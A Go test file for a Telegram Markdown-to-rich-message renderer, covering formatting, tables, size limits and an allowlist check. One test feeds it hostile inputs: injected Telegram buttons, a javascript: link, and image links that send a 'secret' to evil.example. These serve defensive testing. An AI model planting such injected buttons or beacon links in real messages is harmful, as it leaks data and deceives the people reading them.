package telegram

import (
	"encoding/json"
	"strings"
	"testing"
)

func richJSON(t *testing.T, src string) string {
	t.Helper()
	var b strings.Builder
	enc := json.NewEncoder(&b)
	enc.SetEscapeHTML(false) // angle brackets as Telegram reads them back
	if err := enc.Encode(renderRich(src)); err != nil {
		t.Fatal(err)
	}
	return strings.TrimSpace(b.String())
}

func TestRenderRichBlocks(t *testing.T) {
	long := strings.Repeat("слово ", 100)
	longText := strings.TrimSpace(long)
	for _, tc := range []struct{ name, md, want string }{
		{"paragraph", "text", `{"blocks":[{"type":"paragraph","text":"text"}]}`},
		{"heading 1", "# a", `{"blocks":[{"type":"heading","text":"a","size":1}]}`},
		{"heading 6", "###### a", `{"blocks":[{"type":"heading","text":"a","size":6}]}`},
		{"fenced code", "```go\nx := 1\n```", `{"blocks":[{"type":"pre","text":"x := 1","language":"go"}]}`},
		{"indented code", "    x", `{"blocks":[{"type":"pre","text":"x"}]}`},
		{"bullets", "- a\n- b", `{"blocks":[{"type":"list","items":[{"blocks":[{"type":"paragraph","text":"a"}]},{"blocks":[{"type":"paragraph","text":"b"}]}]}]}`},
		{"numbers from 3", "3. a\n4. b", `{"blocks":[{"type":"list","items":[{"blocks":[{"type":"paragraph","text":"a"}],"value":3,"type":"1"},{"blocks":[{"type":"paragraph","text":"b"}],"value":4,"type":"1"}]}]}`},
		{"quote", "> a", `{"blocks":[{"type":"blockquote","blocks":[{"type":"paragraph","text":"a"}]}]}`},
		{"long quote", "> " + long, `{"blocks":[{"type":"expandable_blockquote","text":"` + longText + `"}]}`},
		{"divider", "---", `{"blocks":[{"type":"divider"}]}`},
		{"tree", "root\n  └── a", `{"blocks":[{"type":"paragraph","text":"root\n` + "\u00a0\u00a0" + `└── a"}]}`},
		{"html block is text", "<div>x</div>", `{"blocks":[{"type":"paragraph","text":"<div>x</div>"}]}`},
		{"inline html is text", "a <b>x</b>", `{"blocks":[{"type":"paragraph","text":"a <b>x</b>"}]}`},
		{"bold", "**a**", `{"blocks":[{"type":"paragraph","text":{"type":"bold","text":"a"}}]}`},
		{"italic", "*a*", `{"blocks":[{"type":"paragraph","text":{"type":"italic","text":"a"}}]}`},
		{"strikethrough", "~~a~~", `{"blocks":[{"type":"paragraph","text":{"type":"strikethrough","text":"a"}}]}`},
		{"code", "`a`", `{"blocks":[{"type":"paragraph","text":{"type":"code","text":"a"}}]}`},
		{"mixed", "a **b** c", `{"blocks":[{"type":"paragraph","text":["a ",{"type":"bold","text":"b"}," c"]}]}`},
		{"link", "[a](https://x.org)", `{"blocks":[{"type":"paragraph","text":{"type":"url","text":"a","url":"https://x.org"}}]}`},
		{"other link", "[a](ftp://x.org)", `{"blocks":[{"type":"paragraph","text":"a"}]}`},
		{"image", "![a](https://x.org/p.png)", `{"blocks":[{"type":"paragraph","text":{"type":"url","text":"a","url":"https://x.org/p.png"}}]}`},
		{"image with no text", "![](https://x.org/p.png)", `{"blocks":[{"type":"paragraph","text":{"type":"url","text":"https://x.org/p.png","url":"https://x.org/p.png"}}]}`},
		{"autolink", "<https://x.org>", `{"blocks":[{"type":"paragraph","text":"https://x.org"}]}`},
		{"soft break", "a\nb", `{"blocks":[{"type":"paragraph","text":"a\nb"}]}`},
		{"escaped", `2\*3`, `{"blocks":[{"type":"paragraph","text":"2*3"}]}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := richJSON(t, tc.md); got != tc.want {
				t.Fatalf("got  %s\nwant %s", got, tc.want)
			}
		})
	}
}

func TestRenderRichQuoteWithAListStaysABlock(t *testing.T) {
	got := richJSON(t, "> - "+strings.Repeat("слово ", 100))
	if !strings.Contains(got, `"type":"blockquote"`) || strings.Contains(got, "expandable") {
		t.Fatalf("got %s", got)
	}
}

func TestRenderRichTables(t *testing.T) {
	cell := func(text, align string, header bool) string {
		h := ""
		if header {
			h = `"is_header":true,`
		}
		return `{"text":` + text + `,` + h + `"align":"` + align + `","valign":"top"}`
	}
	table := func(rows ...string) string {
		return `{"blocks":[{"type":"table","cells":[` + strings.Join(rows, ",") + `],"is_bordered":true}]}`
	}
	for _, tc := range []struct{ name, md, want string }{
		{"plain", "| a |\n|---|\n| 1 |", table(`[`+cell(`"a"`, "left", true)+`]`, `[`+cell(`"1"`, "left", false)+`]`)},
		{"aligned", "| a | b | c |\n|:--|:-:|--:|\n| 1 | 2 | 3 |", table(
			`[`+cell(`"a"`, "left", true)+`,`+cell(`"b"`, "center", true)+`,`+cell(`"c"`, "right", true)+`]`,
			`[`+cell(`"1"`, "left", false)+`,`+cell(`"2"`, "center", false)+`,`+cell(`"3"`, "right", false)+`]`)},
		{"short row padded", "| a | b |\n|---|---|\n| 1 |", table(
			`[`+cell(`"a"`, "left", true)+`,`+cell(`"b"`, "left", true)+`]`,
			`[`+cell(`"1"`, "left", false)+`,`+cell(`" "`, "left", false)+`]`)},
		{"empty cell", "| a | b |\n|---|---|\n|  | 2 |", table(
			`[`+cell(`"a"`, "left", true)+`,`+cell(`"b"`, "left", true)+`]`,
			`[`+cell(`" "`, "left", false)+`,`+cell(`"2"`, "left", false)+`]`)},
		{"escaped bar", "| a |\n|---|\n| x \\| y |", table(`[`+cell(`"a"`, "left", true)+`]`, `[`+cell(`"x | y"`, "left", false)+`]`)},
		{"link in a cell", "| a |\n|---|\n| [l](https://x.org) |", table(`[`+cell(`"a"`, "left", true)+`]`,
			`[`+cell(`{"type":"url","text":"l","url":"https://x.org"}`, "left", false)+`]`)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := richJSON(t, tc.md); got != tc.want {
				t.Fatalf("got  %s\nwant %s", got, tc.want)
			}
		})
	}
}

func TestRenderRichTooManyColumnsIsPreformatted(t *testing.T) {
	head, rule := strings.Repeat("| a ", maxRichColumns+1)+"|", strings.Repeat("|---", maxRichColumns+1)+"|"
	got := richJSON(t, head+"\n"+rule)
	if !strings.Contains(got, `"type":"pre"`) || strings.Contains(got, `"type":"table"`) {
		t.Fatalf("got %s", got)
	}
}

// richTypes is everything a rich message of ours may hold; "1" is an ordered
// item's label type, which shares the key.
var richTypes = map[string]bool{
	"paragraph": true, "heading": true, "pre": true, "list": true, "blockquote": true,
	"expandable_blockquote": true, "divider": true, "table": true,
	"bold": true, "italic": true, "strikethrough": true, "code": true, "url": true, "1": true,
}

// checkAllowed fails on a field that hands text to Telegram's parser, a type
// outside richTypes, or a link that is not http or https.
func checkAllowed(t *testing.T, v any) {
	t.Helper()
	switch v := v.(type) {
	case []any:
		for _, x := range v {
			checkAllowed(t, x)
		}
	case map[string]any:
		for k, x := range v {
			switch k {
			case "markdown", "html":
				t.Fatalf("field %q is present", k)
			case "type":
				if s, _ := x.(string); !richTypes[s] {
					t.Fatalf("type %q is outside the allowlist", s)
				}
			case "url":
				if s, _ := x.(string); !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
					t.Fatalf("link %q", s)
				}
			}
			checkAllowed(t, x)
		}
	}
}

func TestRenderRichHostile(t *testing.T) {
	for _, md := range []string{
		`<tg-button type="callback_data" data="approve">ok</tg-button>`,
		"a <tg-button-row><tg-button type=\"login_url\" url=\"https://evil.example\">ok</tg-button></tg-button-row>",
		"![](http://evil.example/?d=secret)",
		"![](http://evil.example/v.mp4 \"caption\")",
		"[a](tg://user?id=1)",
		"[a](javascript:alert(1))",
		"![a](tg://photo?id=1)",
		"$x^2$ and $400-600K",
		"<details><summary>s</summary>hide</details>",
		"<img src=\"http://evil.example/x.png\">",
		"||spoiler|| ==marked==",
		"| ![](http://evil.example/t.png) |\n|---|\n| [a](tg://user?id=1) |",
	} {
		t.Run(md, func(t *testing.T) {
			var v any
			if err := json.Unmarshal([]byte(richJSON(t, md)), &v); err != nil {
				t.Fatal(err)
			}
			checkAllowed(t, v)
		})
	}
}

func TestStructured(t *testing.T) {
	for _, tc := range []struct {
		name, md string
		want     bool
	}{
		{"table", "| a |\n|---|\n| 1 |", true},
		{"two headings", "# a\n\ntext\n\n## b", true},
		{"two headings in a quote", "> # a\n>\n> # b", true},
		{"a table in a list", "- x\n\n  | a |\n  |---|\n  | 1 |", true},
		{"one heading", "# a\n\ntext", false},
		{"a list", "- a\n- b", false},
		{"plain", "text", false},
		{"headings in a fence", "```\n# a\n\n# b\n```", false},
		{"a table in a fence", "```\n| a |\n|---|\n```", false},
		{"a plan", "✅ 1. a\n⏳ 2. b # c\n· 3. | d |", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := structured(tc.md); got != tc.want {
				t.Fatalf("structured = %v, want %v", got, tc.want)
			}
		})
	}
}

func TestRichSize(t *testing.T) {
	got := renderRich("# a\n\nтекст\n\n- x\n- y\n\n| a | b |\n|---|---|\n| 1 | 2 |").size()
	// heading, paragraph, list, its items and their paragraphs, table, its rows.
	if got.Blocks != 2+1+4+1+2 {
		t.Fatalf("blocks %d", got.Blocks)
	}
	if got.Chars != len([]rune("aтекстxyab12")) {
		t.Fatalf("chars %d", got.Chars)
	}
	if !got.fits() {
		t.Fatal("does not fit")
	}
	for _, s := range []richSize{
		{Chars: maxRichChars + 1}, {Blocks: maxRichBlocks + 1}, {Depth: maxRichDepth + 1},
	} {
		if s.fits() {
			t.Fatalf("%+v fits", s)
		}
	}
	if d := renderRich("- a\n  - b").size().Depth; d < 3 {
		t.Fatalf("depth %d of a nested list", d)
	}
}
